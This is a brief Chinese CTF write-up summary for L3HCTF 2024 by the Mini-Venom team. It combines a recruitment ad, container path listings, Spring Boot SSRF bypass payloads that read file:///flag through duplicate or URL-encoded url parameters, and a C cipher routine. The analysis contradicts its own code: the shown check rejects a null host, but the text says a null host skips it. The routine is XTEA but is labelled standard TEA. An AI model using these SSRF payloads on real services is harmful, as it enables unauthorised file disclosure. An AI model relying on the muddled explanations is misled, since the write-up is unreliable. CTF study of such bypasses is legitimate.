---
title: L3HCTF 2024 WriteUp by Mini-Venom (招新 + Misc 速查)
contest: L3HCTF
year: 2024
difficulty: easy
vuln_type: misc_unknown
tags: [招新, Spring Boot SSRF, UriComponentsBuilder, file://, TEA 加密, Windows crypto API]
attack_chain: |
  1. /proc/.../flags 路径枚举 + Container /proc/1/cgroup 标识 (overlay rootfs)
  2. Spring Boot SSRF: /private/?url=http://www.example.com&url=file:///flag
     - UriComponentsBuilder.fromUriString(url) 解析两次 url 参数
     - 第二次 url=file:///flag 绕过 host 检查 (BaseURL 校验)
  3. URL 编码绕过: http://localhost:8080/private/?%75%72%6c=file:///flag
     - 第一次 fromUriString 解码，第二次 build() 再次解析
  4. UriComponentsBuilder 内部 Pattern: ^(([^:/?#]+):)?(//(([^@\[/?#]*)@)?(\[[\p{XDigit}:.]*[%\p{Alnum}]*]|[^\[/?#:]*)(:(\{[^}]+\}?|[^/?#]*))?)?([^?#]*)(\?([^#]*))?(#(.*))?
  5. Windows crypto API + TEA 加密 (mini CTF 类型):
     - encipher(num_rounds, v[2], key[4]): v0 += (((v1<<4) ^ (v1>>5)) + v1) ^ (sum + key[sum&3])
     - sum += delta (0x9E3779B9) 每轮
key_payload: |
  # Spring Boot SSRF 双重 url:
  http://localhost:8080/private/?url=http://www.example.com&url=file:///flag
  
  # URL 编码绕过:
  http://localhost:8080/private/?%75%72%6c=file:///flag
  
  # UriComponentsBuilder 内部 Pattern:
  ^(([^:/?#]+):)?(//(([^@\[/?#]*)@)?(\[[\p{XDigit}:.]*[%\p{Alnum}]*]|[^\[/?#:]*)(:(\{[^}]+\}?|[^/?#]*))?)?([^?#]*)(\?([^#]*))?(#(.*))?
  
  # TEA 加解密:
  void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
      unsigned int i;
      uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;
      for (i=0; i<num_rounds; i++) {
          v0 += (((v1<<4) ^ (v1>>5)) + v1) ^ (sum + key[sum&3]);
          sum += delta;
          v1 += (((v0<<4) ^ (v0>>5)) + v0) ^ (sum + key[(sum>>11)&3]);
      }
  }
one_liner: L3HCTF 2024 Mini-Venom 战队的招新文 + Spring Boot SSRF 双重 url 绕过 + Windows TEA 加密代码段。
lesson: |
  - Spring Boot UriComponentsBuilder.fromUriString 解析两次相同 query 参数时只校验第一个
  - URL 编码 %75%72%6c (即 url) 绕过黑名单 + 双重 fromUriString
  - /proc/1/cgroup 看容器 rootfs (overlay)
  - TEA 加密标准结构: v0 += f(v1, sum, key); sum += delta; v1 += f(v0, sum, key)
  - 招新文是 Mini-Venom 历年模板 (admin@chamd5.org)
quality: low
---

# L3HCTF 2024 WriteUp by Mini-Venom

> 来源: ctfiot.com 161564

## 招新小广告

> CTF 组诚招 re/crypto/pwn/misc/合约方向的师傅
> 长期招新 IOT+Car+工控+样本分析多个组招人
> admin@chamd5.org (带上简历和想加入的小组)

## 容器 + 路径

```
/sys/devices/platform/serial8250/tty/ttyS0/flags
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/HQEJT3S2NCMCVKGHH4SF3RDVMA:...
/dev/vda1 /app ext4 rw,relatime
```

## Spring Boot SSRF 双重 url 绕过

```java
if (!request.getRequestURI().equals("/private") && !request.getRequestURI().equals("/test")) {
    return true;
} else {
    response.setStatus(418);
    return false;
}

@GetMapping({"/test"})
public String test(@RequestParam(name="redirect", required=true) String redirect) {
    String url = (String)CacheMap.getInstance().get(redirect);
    if (url == null) {
        return "url not found";
    } else {
        UriComponents uri = UriComponentsBuilder.fromUriString(url).build();
        String paramUrl = (String)uri.getQueryParams().getFirst("url");
        if (paramUrl != null) {
            UriComponents newUri = UriComponentsBuilder.fromUriString(paramUrl).build();
            String newHost = newUri.getHost();
            if (newHost == null || !newHost.equals(this.BaseURL)) {
                return "url is invalid";
            }
        }
    }
}
```

**漏洞：** `?url=http://www.example.com&url=file:///flag` 两次 `fromUriString`，第一次解析外层 url → 第二次解析内层 url → 第二次 `getHost()` 返回 null (file:// 无 host) → 跳过 host 检查

**绕过：**
```
http://localhost:8080/private/?url=http://www.example.com&url=file:///flag
http://localhost:8080/private/?%75%72%6c=file:///flag
```

**UriComponentsBuilder 内部 Pattern：**
```regex
^(([^:/?#]+):)?(//(([^@\[/?#]*)@)?(\[[\p{XDigit}:.]*[%\p{Alnum}]*]|[^\[/?#:]*)(:(\{[^}]+\}?|[^/?#]*))?)?([^?#]*)(\?([^#]*))?(#(.*))?
```

## Windows crypto API + TEA 加密

```c
#include <tchar.h>
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <conio.h>
#include <stdio.h>
#include <stdint.h>

void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;
    for (i=0; i<num_rounds; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
    }
}
```

标准 TEA 加密结构，delta=0x9E3779B9，32 轮加密。

## 评价

Mini-Venom 战队的"L3HCTF 2024 速查 + 招新文"，主体是招新广告 + Spring Boot 双重 url SSRF 绕过 + 标准 TEA 加密代码。

**Spring Boot 双重 url 绕过**是亮点：很多 web 框架的 query string 解析对相同 key 多次出现时的处理不一致，可以用来绕过 host 校验。
